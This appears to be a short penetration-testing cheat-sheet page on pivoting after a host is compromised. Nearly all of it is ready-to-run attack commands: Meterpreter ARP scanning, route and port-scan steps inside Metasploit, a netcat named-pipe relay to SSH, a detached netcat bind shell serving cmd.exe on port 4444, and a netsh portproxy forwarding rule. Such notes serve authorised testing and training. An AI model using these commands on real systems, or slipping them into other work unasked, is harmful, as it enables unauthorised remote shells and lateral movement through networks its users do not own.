---
title: Pivot
category: Post-Exploitation
order: 97
---

>**Metasploit and Meterpreter**

{% highlight bash %}
meterpreter> ipconfig 
Broadcom 440x 10/100 Integrated Controller - Packet Scheduler Miniport
Hardware MAC: 00:0b:db:1d:d3:2b
IP Address : 192.168.15.3
Netmask : 255.255.255.0

meterpreter > run arp_scanner -r 192.168.15.1/24
[*] ARP Scanning 192.168.15.1/24
[*] IP: 192.168.15.5 MAC d8:d3:85:ff:ff:ff
[*] IP: 192.168.15.5 MAC d8:d3:85:ff:ff:ff

route add 192.168.15.1 255.255.255.0 1

msf exploit(handler) > use auxiliary/scanner/portscan/tcp
msf auxiliary(tcp) > set RHOSTS 192.168.15.1
RHOSTS => 192.168.15.1
msf auxiliary(tcp) > set PORTS 1-1024
PORTS => 1-1024

{% endhighlight %}

> **Netcat Relay** 

Relay | <code> Mknod backpipe p <br> nc -l -p [allowed_inbound_port] 0<backpipe | nc 127.0.0.1 22 1>backpipe <br> ssh login@[target] -p [allowed_inbound_port] </code>
Remote Netcat (detached) | <code> nc.exe -d -l -p 4444 -e cmd.exe </code>

> **netsh pivot** 

netsh interface portproxy add v4tov4 listenport=<LPORT> listenaddress=0.0.0.0 connectport=<RPORT> connectaddress=<RHOST>

> **useful resources** 

* [SSH Cheat Sheet](http://pentestmonkey.net/cheat-sheet/ssh-cheat-sheet)
* [Meterpreter Pivot](https://pen-testing.sans.org/blog/2012/04/26/got-meterpreter-pivot)
* [Nessus through Proxy](https://blog.elearnsecurity.com/nessus-and-metasploit-scan-networks-in-pivoting.html)


